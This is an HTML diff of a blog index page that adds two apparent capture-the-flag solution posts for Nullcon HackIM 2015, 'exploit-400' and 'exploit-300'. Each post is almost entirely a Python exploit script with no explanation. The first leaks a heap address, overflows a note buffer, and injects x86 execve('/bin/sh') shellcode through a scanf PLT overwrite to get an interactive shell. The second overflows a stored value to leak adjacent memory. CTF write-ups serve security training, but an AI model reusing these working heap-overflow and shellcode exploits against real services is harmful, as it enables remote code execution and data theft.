@@ -204,6 +204,112 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-nullcon-hackim-2015-exploit-4" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/03/15/nullcon-hackim-2015-exploit-4/" class="article-date">
+  	<time datetime="2015-03-15T06:53:32.000Z" itemprop="datePublished">2015-03-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/03/15/nullcon-hackim-2015-exploit-4/">HackIM-2015-exploit-400</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>Download: <a href="http://bigtang.org/files/MentalNote.tar.gz">MentalNote.tar.gz</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.1.102"</span></span><br><span class="line">port = <span class="number">1234</span></span><br><span class="line"></span><br><span class="line">target = (host,port)</span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=<span class="number">1</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),\</span><br><span class="line">	print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">()</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Your Choice:\n"</span>)</span><br><span class="line">	io.writeline(<span class="string">'1'</span>)</span><br><span class="line">	io.read_until(<span class="string">"Give the type of the Note:\n"</span>)</span><br><span class="line">	io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span><span class="params">(v)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Your Choice:\n"</span>)</span><br><span class="line">	io.writeline(<span class="string">'2'</span>)</span><br><span class="line">	io.read_until(<span class="string">"Give the Note id to delete:\n"</span>)</span><br><span class="line">	io.writeline(v[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(v)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Your Choice:\n"</span>)</span><br><span class="line">	io.writeline(<span class="string">'3'</span>)</span><br><span class="line">	io.read_until(<span class="string">"Give the Note id to edit:\n"</span>)</span><br><span class="line">	io.writeline(v[<span class="number">0</span>])</span><br><span class="line">	io.read_until(<span class="string">"Give the type to edit:"</span>)</span><br><span class="line">	io.writeline(v[<span class="number">1</span>])</span><br><span class="line">	io.read_until(<span class="string">"Give your Note:\n"</span>)</span><br><span class="line">	io.writeline(v[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(v)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Your Choice:\n"</span>)</span><br><span class="line">	io.writeline(<span class="string">'4'</span>)</span><br><span class="line">	io.read_until(<span class="string">"Give the Noteid to print:\n"</span>)</span><br><span class="line">	io.writeline(v[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">add_note()</span><br><span class="line">add_note()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">212</span> + <span class="string">"bbb"</span></span><br><span class="line">v1 = [<span class="string">'0'</span>,<span class="string">'2'</span>,payload1]</span><br><span class="line">edit_note(v1)</span><br><span class="line"></span><br><span class="line">v2 = [<span class="string">'0'</span>]</span><br><span class="line">show_note(v2)</span><br><span class="line">io.read_until(<span class="string">"bbb\n"</span>)</span><br><span class="line">data = io.read(<span class="number">8</span>)[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">add_note()</span><br><span class="line">add_note()</span><br><span class="line"></span><br><span class="line"><span class="comment"># x86/linux/exec: 24 bytes</span></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line"><span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">scanf_plt = <span class="number">0x804b024</span></span><br><span class="line">shellcode_addr = l32(data)<span class="number">-0xd0</span></span><br><span class="line"><span class="keyword">print</span> hex(shellcode_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"\x90"</span>*(<span class="number">212</span>-len(shellcode))</span><br><span class="line">payload2 += shellcode</span><br><span class="line">payload2 += l32(scanf_plt<span class="number">-0x8</span>)</span><br><span class="line">payload2 += l32(shellcode_addr)</span><br><span class="line">v3 = [<span class="string">'2'</span>,<span class="string">'2'</span>,payload2]</span><br><span class="line">edit_note(v3)</span><br><span class="line"></span><br><span class="line">v4 = [<span class="string">'3'</span>]</span><br><span class="line">del_note(v4)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-nullcon-hackim-2015-exploit-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/03/15/nullcon-hackim-2015-exploit-3/" class="article-date">
+  	<time datetime="2015-03-15T06:53:29.000Z" itemprop="datePublished">2015-03-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/03/15/nullcon-hackim-2015-exploit-3/">HackIM-2015-exploit-300</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>Download: <a href="http://bigtang.org/files/sample3.tar.gz">sample3.tar.gz</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.1.103"</span></span><br><span class="line">port = <span class="number">9003</span></span><br><span class="line">target = (host,port)</span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=<span class="number">1</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),\</span><br><span class="line">print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_set</span><span class="params">(node)</span>:</span></span><br><span class="line">io.read_until(<span class="string">"Command% "</span>)</span><br><span class="line">io.writeline(<span class="string">"set "</span> + node[<span class="number">0</span>] + <span class="string">' '</span> + node[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(node)</span>:</span></span><br><span class="line">io.read_until(<span class="string">"Command% "</span>)</span><br><span class="line">io.writeline(<span class="string">"get "</span>+ node[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">node1 = [<span class="string">'a'</span>,<span class="string">'a'</span>*<span class="number">4096</span>]</span><br><span class="line">_set(node1)</span><br><span class="line"></span><br><span class="line">node2 = [<span class="string">"key"</span>,<span class="string">"Bigtang"</span>]</span><br><span class="line">_set(node2)</span><br><span class="line"></span><br><span class="line">_get(node1)</span><br><span class="line"></span><br><span class="line">data = io.read_until(<span class="string">"Command% "</span>)[<span class="number">4096</span>:][:<span class="number">-10</span>]</span><br><span class="line"></span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Binggo: "</span> + data</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-nullcon-hackim-2015-exploit-2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
